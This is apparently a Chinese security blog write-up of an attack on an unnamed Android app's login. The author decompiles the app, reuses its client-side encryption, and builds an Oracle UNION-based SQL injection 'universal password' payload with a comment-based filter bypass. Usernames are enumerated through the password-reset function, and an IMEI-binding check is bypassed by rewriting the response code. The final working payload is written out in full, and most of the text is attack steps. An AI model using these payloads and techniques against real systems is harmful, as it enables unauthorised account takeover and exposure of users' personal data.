打开APP是一个登录框  

![](../Images/8d03a12e58d6ef127b4ac67010a60dd2.png)

抓包后发现参数被加密了  

![](../Images/d3ab7f9c0b5a2bcdadcc5a4b0a98fffa.png)

使用`Jadx`脱源码发现，并没有加壳也没有混淆，运气很好  

![](../Images/633f71578a6d058b2edf6f511067a2f2.png)

根据经验，先搜索`Encrypt、Decrypt`等关键字，发现在Common.js中有一个`encryptData`函数

![](../Images/c5ba79f72c34c654ec76e449cccc0095.png)

  
定位过去，一套加解密算法都写好了放在这  

![](../Images/2be19eebdf38bed5a6cf2fbe9f697b12.png)

  
放到浏览器console里面调试，果然没错

![](../Images/d6645d0e1f5cbf3012c8743150511085.png)

首先测试了一下注入  

```
明文：

{"userName":"TEST'","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}
```

![](../Images/594058c93edcd85fcdc26d2c818d76f5.png)

```


明文：{"userName":"TEST''","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}
```

![](../Images/b7b352a78751b91c952c388462f5890c.png)

```


明文：{"userName":"TEST'or'1'='1","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}
```

  

![](../Images/5df6f7b003235bf41ed2eeab172d528f.png)至此已经可以判断该登录点就是一个注入了，可是返回结果始终都是“用户名或密码错”即使用了`' or '1'='1`  

![](../Images/776ca00382c891a247932ecdb6957ec6.png)根据返回结果推测，后端的登录处的逻辑代码可能是这样的

```






userInfo = 'select * from userinfo where username = <userName>';
```

通过Union注入构造万能密码，是可以造成任意用户登陆的，测试过程如下  
先使用`order by`测试，得知字段的数量为9个，构造`payload`

```



# 由于目标服务器带有过滤，所以这里简单的bypass一下
```

![](../Images/d349939feea8d6fbbe415c5ce6491d5d.png)

  

由于`Oracle`在进行`union`查询时，所对应的字段数据类型也必须相同，所以还要进行字段数据类型的测试，最终结果如下

```



# 注意这里passWord我修改成了123，用来测试Union构造的万能密码是否可行
```

  

![](../Images/a75d733bc06fb2e9eb9569226db8d7b1.png)

![](../Images/4f08aa4fa4034b350865866d8ff828db.png)

接下来就是一个字段一个字段的改过去，判断哪个字段对应的是密码字段，测试结果如下

```



# 注意这里passWord我修改成了Ceshi123@@@，不再是弱口令了
```

![](../Images/db621c840767c42e014f81f3f1c77dda.png)

![](../Images/000ca6ee0af46909fc4e748990ca9f5f.png)

在绕过后，发现程序出现了异常

![](../Images/7d716937c48852d1ac2f1b6f32d10c8c.png)

仔细观察返回的数据，其中有username（用户名）、staffId（职工号）、email（邮箱）、staffName（姓名）、tel（手机号）、mobile（手机号），然而这些数据都是我刚刚自己随便构造的，这里应该需要一个真实的用户信息，供后续的登录流程使用  

![](../Images/60eeb338212a1a5bed2960c15ab11884.png)

好在，还是有一个地方能获取真实的用户信息的  
App还有一个忘记密码的功能（通常这里可以爆破用户名）  

![](../Images/0a980b3e4a6206628e5b902ac3127111.png)

利用忘记密码的功能可以判断用户名是否存在，这里随便跑了一下字典，就出来好多用户名

![](../Images/8d373dc3fdc66ed0e944a5f3f4d2c07d.png)

  

![](../Images/c180a1160077665263b8e80c0fd9f4e5.png)

自然而然地利用这些用户名使用短信验证码登录  

![](../Images/cefe6f72094c22142a54cf5a56458871.png)

获取验证码，然后解密数据包，惊奇的发现返回了用户基本信息  

![](../Images/a922b977149dd998c91bc423852695c6.png)

根据登录返回结果，重新测试payload，最终结果如下

```


明文：{"userName":"TEST\'union/**/select/**/<staffId>,\'Qwe123@@@\',\'<userName>\',\'Qwe123@@@\',\'<mobile>\',\'<mobile>\',\'<email>\',\'865166023309431\',<staffId> from dual -- ","passWord":"Qwe123@@@","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}
```

![](../Images/eff8c005ddd6ce19ddb7e618da4abdc3.png)

仔细看返回的登录数据，已经正常了  

![](../Images/279b875f3e6cc53fd3c6291f7966b1fa.png)

  

然后重新替换数据包登录，提示绑定IMEI

![](../Images/4a349935aaefd6dc28ee05e94d8e6e5f.png)

这个绕过很简单，随便输入验证码，替换返回包，把resultCode从1001改为1000就行（常规操作）  

![](../Images/9f40fe7654297434322c1a086ab675df.png)

![](../Images/24cc5c1bb31158dfa4ef028ea7faf951.png)
